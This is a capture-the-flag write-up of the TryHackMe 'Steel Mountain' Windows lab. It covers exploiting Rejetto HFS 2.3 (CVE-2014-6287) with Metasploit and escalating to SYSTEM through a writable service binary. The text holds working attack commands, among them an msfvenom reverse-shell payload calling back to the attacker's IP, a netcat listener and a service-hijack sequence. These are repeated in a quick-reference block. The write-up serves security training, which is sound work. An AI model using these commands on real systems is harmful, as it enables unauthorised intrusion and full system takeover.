# THM — Steel Mountain

> **Platform:** TryHackMe  
> **Difficulty:** Medium  
> **OS:** Windows  
> **Tags:** `#thm` `#windows` `#hfs` `#metasploit` `#powerup` `#unquoted-service-path` `#privesc` `#rejetto` `#cve-2014-6287`

---

## Kill Chain Summary

```
Nmap Scan → HFS 2.3 Discovery → Rejetto RCE (Metasploit) → Meterpreter Shell
→ PowerUp Enumeration → Unquoted Service Path → Binary Replacement → NT AUTHORITY\SYSTEM
```

---

## 1. Reconnaissance — Nmap Scan

**Command:**

```bash
nmap -sV -p 8080 <TARGET_IP>
```

**Key results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 8080/tcp | open | HTTP | Rejetto HTTP File Server (HFS) 2.3 |

HFS 2.3 is known to be vulnerable to **Remote Code Execution via HTTP null-byte injection** (CVE-2014-6287). The vulnerability allows an unauthenticated attacker to execute arbitrary commands on the server through a specially crafted search query.

> 💡 A full port scan (`nmap -sV -sC <TARGET_IP>`) is recommended as a first step to avoid missing services on non-standard ports.

---

## 2. Initial Access — Rejetto HFS RCE (Metasploit)

**Module:**

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <TARGET_IP>
set RPORT 8080
set LHOST tun0
run
```

> ⚠️ **OPSEC Note:** Always set `LHOST` to the `tun0` interface (VPN IP) when working on TryHackMe or HTB labs — using `eth0` (local VM IP) will result in a failed callback since the target cannot reach your local network.

✅ Meterpreter session opened as user `bill`.

**User Flag:**

```bash
cat C:\Users\bill\Desktop\user.txt
```

---

## 3. Privilege Escalation Enumeration — PowerUp.ps1

**PowerUp** is a PowerShell script from the PowerSploit framework that automates the discovery of common Windows privilege escalation vectors.

**Step 1 — Upload the script**

```bash
# In Meterpreter
cd C:\\Users\\bill\\Desktop
upload /home/kali/PowerUp.ps1
```

**Step 2 — Execute**

```bash
load powershell
powershell_shell
. .\PowerUp.ps1
Invoke-AllChecks
```

**Finding — Vulnerable Service:**

```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
```

Two compounding weaknesses make this service exploitable:

- **Unquoted Service Path / Weak File Permissions:** The service binary path is writable by the current user.
- **CanRestart: True:** The current user has permission to stop and start the service — meaning we can trigger execution of a replaced binary without waiting for a reboot.

---

## 4. Privilege Escalation — Binary Replacement

**Step 1 — Generate the malicious payload (Kali)**

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=<YOUR_VPN_IP> \
  LPORT=4443 \
  -e x86/shikata_ga_nai \
  -f exe-service \
  -o Advanced.exe
```

> The `-f exe-service` format is important here — it produces a binary that behaves correctly when launched as a Windows service, preventing the service manager from marking it as failed.

**Step 2 — Start the listener (Kali, new terminal)**

```bash
nc -lvnp 4443
```

**Step 3 — Stop the service**

```bash
# Drop into Windows cmd shell from Meterpreter
shell
sc stop AdvancedSystemCareService9
exit
```

**Step 4 — Replace the binary**

```bash
# Back in Meterpreter
cd "C:\Program Files (x86)\IObit\Advanced SystemCare"
upload Advanced.exe ASCService.exe
```

**Step 5 — Restart the service (exploit trigger)**

```bash
shell
sc start AdvancedSystemCareService9
```

The service manager executes `ASCService.exe` under **NT AUTHORITY\SYSTEM** — which is now our payload.

✅ Reverse shell received on the Netcat listener as `NT AUTHORITY\SYSTEM`.

---

## 5. Flags

```cmd
# User flag
type C:\Users\bill\Desktop\user.txt

# Root flag
type C:\Users\Administrator\Desktop\root.txt
```

---

## 6. Vulnerability Summary

| # | Finding | Severity | Detail |
|---|---------|----------|--------|
| 1 | HFS 2.3 — Unauthenticated RCE | 🔴 Critical | CVE-2014-6287: null-byte injection allows remote code execution |
| 2 | Outdated third-party software exposed | 🔴 High | HFS 2.3 running on a public-facing port with no authentication |
| 3 | Weak service binary permissions | 🔴 Critical | Low-privilege user can overwrite `ASCService.exe` |
| 4 | CanRestart: True for unprivileged user | 🔴 High | Attacker can trigger privileged execution without reboot |
| 5 | Unquoted service path | 🟡 Medium | Compounds the binary replacement attack surface |

---

## 7. Key Takeaways

- **Always set LHOST to tun0:** In lab environments (THM, HTB), the target machine routes traffic through the VPN tunnel. Setting `LHOST` to the local VM IP (`eth0`) produces a valid-looking configuration that silently fails at callback time.
- **`sc` commands belong in `shell`, not Meterpreter:** Service Control Manager commands (`sc stop`, `sc start`) must be run inside a Windows `cmd` shell. Meterpreter has its own command set and does not pass `sc` to the OS directly.
- **`CanRestart: True` is game over:** When PowerUp reports `CanRestart: True` alongside writable service binary permissions, the attack chain is complete and requires no additional conditions — no reboots, no race conditions, no admin interaction.
- **`-f exe-service` matters:** Standard `-f exe` payloads will cause the service to report as failed immediately after launch. The `exe-service` format wraps the shellcode in a proper service harness, keeping the service manager satisfied while the payload executes.
- **PowerUp is your first post-exploitation step on Windows:** Before attempting any manual enumeration, running `Invoke-AllChecks` surfaces the most common misconfigurations in seconds.

---

## Quick Reference — Key Commands

```bash
# Recon
nmap -sV -p 8080 <TARGET_IP>

# Metasploit - HFS exploit
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <TARGET_IP>
set RPORT 8080
set LHOST tun0
run

# Upload PowerUp and enumerate
upload /home/kali/PowerUp.ps1
load powershell && powershell_shell
. .\PowerUp.ps1; Invoke-AllChecks

# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=<VPN_IP> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe

# Listener
nc -lvnp 4443

# Service control (inside Windows shell)
sc stop AdvancedSystemCareService9
sc start AdvancedSystemCareService9

# Flags
type C:\Users\bill\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

*Writeup completed on 30/03/2026 — TryHackMe / Steel Mountain*
